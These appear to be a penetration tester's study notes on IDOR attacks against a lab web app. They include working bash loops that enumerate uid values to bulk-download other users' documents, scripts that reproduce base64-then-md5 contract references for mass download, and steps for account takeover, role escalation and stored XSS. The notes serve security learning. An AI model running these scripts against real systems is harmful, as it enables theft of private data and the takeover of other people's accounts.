# IDOR

## IDOR

### Identifying IDORs

#### URL parameters & APIs

Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file\_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

⇒ Try incrementing the value or fuzz

#### AJAX Calls

Check the JS code for unused functions. Because some admin functions would be disabled if we have a standard user account, but we may still see them in the source code. We can then try to use them

#### Understand Hashing/Encoding

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead ⇒ try to find the encoding method used

Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded (from its character set), which we can decode to get the original object reference of (`file_123.pdf`). Then, we can try encoding a different object reference (e.g. `file_124.pdf`) and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`), which may reveal an IDOR vulnerability if we were able to retrieve any data.

#### Compare User Roles

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references.

For example, if we had access to two different users, one of which can view their salary after making the following API call

```shellscript
{
  "attributes" :
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as User1. However, with these details at hand, we can try repeating the same API call while logged in as User2 to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the\
API call but has no access control on the back-end to compare the caller's session with the data being called. If this is the case, and we can calculate the API parameters for other users, this would be an IDOR vulnerability. Even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit

### Mass IDOR enumeration

We see the following documents with the `uid=1` parameter

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2KVY9pDZdiKlpzRt6x83%2Fimage.png?alt=media&#x26;token=356abe03-1069-4c85-aa0a-f9806a04a5cc" alt=""><figcaption></figcaption></figure>

Look at the source code to see where the files are located

```shellscript
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

See how we can curl and use grep to get those lines only

```shellscript
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Trim the extra parts to only keep the document links

```shellscript
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Iterate over the uid parameter to return the documents of all employees and download them

```shellscript
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

### Bypassing Encoded References

If we try to download the following file

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fg6y4VbPRgCVPrFgIIq9k%2Fweb_attacks_idor_contracts.jpg?alt=media&#x26;token=31bce551-6d08-4fa0-b3cb-05919d10a424" alt=""><figcaption></figcaption></figure>

We would get the following request in burp. It would be worth trying to try and understand how the value is created. Is it md5 ?

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FXLTJLL449R9XPxRhmLEx%2Fweb_attacks_idor_download_contract.jpg?alt=media&#x26;token=01202eb8-d578-48d6-ae70-66368fcfdaf8" alt=""><figcaption></figcaption></figure>

Try to see if we can make some matches

```shellscript
echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

#### Function disclosure

Sometimes the value may be encoded. We can try to fuzz for the encoded value, but it is complicated

Instead, we should look if the app is vulnerable and if the code for the encryption function is on the client side

For example, here the uid is ran through base64 then md5 hashed

```shellscript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

#### Mass enumeration

We can then try mass enumeration with the following

```shellscript
# Produce the encrypted value for 1 to 10. We use echo -n and base64 -w 0 to avoid new
# lines, which would mess up the hash value
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Then hit the endpoint to download files

```shellscript
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### IDOR in Insecure APIs

While IDOR `Information Disclosure Vulnerabilitie`s allow us to read various types of resources, IDOR `Insecure Function Calls` enable us to call APIs or execute functions as another user

Example of request a user we control could make

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FydubTys1Sy4BfqT5h9OH%2Fweb_attacks_idor_update_request.jpg?alt=media&#x26;token=ca5f9782-8012-4b9b-ba8d-7d35317354d3" alt=""><figcaption></figcaption></figure>

There are a few things we could try in this case:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

Here we try to change the uid in the request body

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjL3q4E0EqPDaYsilXTZO%2Fweb_attacks_idor_uid_mismatch.jpg?alt=media&#x26;token=190bfd7d-a780-4890-b556-ccf784a0cf69" alt=""><figcaption></figcaption></figure>

We get an error, so we change the parameter in the url as well

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbonlUh5CvnWqmvcjrdiR%2Fweb_attacks_idor_uuid_mismatch.jpg?alt=media&#x26;token=ac402658-5351-47e0-9f4f-56041ccbd7fb" alt=""><figcaption></figcaption></figure>

Error as well, try to change the HTTP method

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F9oueiA7LjOidQxIzNoH1%2Fweb_attacks_idor_create_new_user_1.jpg?alt=media&#x26;token=b3cdd301-dccf-4941-8d0c-a0d6ca9e90cb" alt=""><figcaption></figcaption></figure>

Error again, try to change our user role

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FHR8a1Msbz07MyiYMifr4%2Fweb_attacks_idor_invalid_role.jpg?alt=media&#x26;token=0d340487-ff8f-4193-a252-a8815b636a7b" alt=""><figcaption></figcaption></figure>

### Chaining IDOR Vulnerabilities

Modify the `uid` parameter in a GET request gives us all the attributes for a user

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fi4Hk2FDUyrlAw6tOSlNJ%2Fweb_attacks_idor_get_another_user.jpg?alt=media&#x26;token=4e31932e-6a61-4f58-af09-fa39f90560d4" alt=""><figcaption></figcaption></figure>

Change the users details now that we know his uuid

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FVnfkF5oj667Uf7l9BBoS%2Fweb_attacks_idor_modify_another_user.jpg?alt=media&#x26;token=4d7a6bfc-a4ff-4ec7-b65f-670f9eba915c" alt=""><figcaption></figcaption></figure>

We see the result is successful

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FVI1r7ITOs4LOGzf8T3FR%2Fweb_attacks_idor_new_another_user_details.jpg?alt=media&#x26;token=dd5750aa-e917-4419-a816-009d45ef3841" alt=""><figcaption></figcaption></figure>

In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. <mark style="background-color:$danger;">Another potential attack is</mark> <mark style="background-color:$danger;">`placing an XSS payload in the 'about' field`</mark><mark style="background-color:$danger;">, which would get executed once the user visits their</mark> <mark style="background-color:$danger;">`Edit profile`</mark> <mark style="background-color:$danger;">page, enabling us to attack the user in different ways</mark>

### Example

{% embed url="https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/~/edit/~/changes/1/web/xxe" %}
